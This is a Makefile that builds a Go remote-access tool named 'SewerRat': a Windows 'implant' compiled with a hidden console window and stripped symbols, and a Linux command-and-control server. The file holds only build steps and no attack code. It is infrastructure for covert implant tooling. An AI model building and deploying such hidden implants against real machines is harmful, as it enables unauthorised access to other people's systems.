.PHONY: all implant server clean dist-clean deps

# Build directories
DIST_DIR := dist
BUILD_FLAGS := -trimpath

# Go build variables
GOOS_WINDOWS := GOOS=windows
GOARCH_AMD64 := GOARCH=amd64
LDFLAGS := -ldflags "-H=windowsgui -s -w"

all: deps implant server

# Install/verify dependencies
deps:
	@echo "[*] Checking dependencies..."
	go mod download
	go mod tidy

# Build Windows implant with hidden console
implant: deps
	@echo "[*] Building Windows implant (SewerRat.exe)..."
	@mkdir -p $(DIST_DIR)
	$(GOOS_WINDOWS) $(GOARCH_AMD64) go build $(BUILD_FLAGS) $(LDFLAGS) \
		-o $(DIST_DIR)/SewerRat.exe \
		./cmd/implant
	@echo "[+] Built: $(DIST_DIR)/SewerRat.exe"

# Build Linux server
server: deps
	@echo "[*] Building Linux C2 server..."
	@mkdir -p $(DIST_DIR)
	go build $(BUILD_FLAGS) \
		-o $(DIST_DIR)/sewerrat-server \
		./cmd/server
	@echo "[+] Built: $(DIST_DIR)/sewerrat-server"

# Build for current platform (for testing)
dev: deps
	@echo "[*] Building for current platform..."
	@mkdir -p $(DIST_DIR)
	go build -o $(DIST_DIR)/sewerrat-dev-implant ./cmd/implant
	go build -o $(DIST_DIR)/sewerrat-dev-server ./cmd/server
	@echo "[+] Built development binaries"

# Clean build artifacts
clean:
	@echo "[*] Cleaning build artifacts..."
	rm -f $(DIST_DIR)/SewerRat.exe
	rm -f $(DIST_DIR)/sewerrat-server
	rm -f $(DIST_DIR)/sewerrat-dev-implant
	rm -f $(DIST_DIR)/sewerrat-dev-server

# Clean all including dist directory
dist-clean: clean
	@echo "[*] Cleaning dist directory..."
	rm -rf $(DIST_DIR)

# Help
help:
	@echo "SewerRat Build System"
	@echo "====================="
	@echo ""
	@echo "Targets:"
	@echo "  make all       - Build implant and server"
	@echo "  make implant   - Build Windows implant only"
	@echo "  make server    - Build Linux server only"
	@echo "  make dev       - Build for current platform (testing)"
	@echo "  make clean     - Remove built binaries"
	@echo "  make dist-clean- Remove dist directory"
	@echo "  make deps      - Install/verify dependencies"
	@echo "  make help      - Show this help"
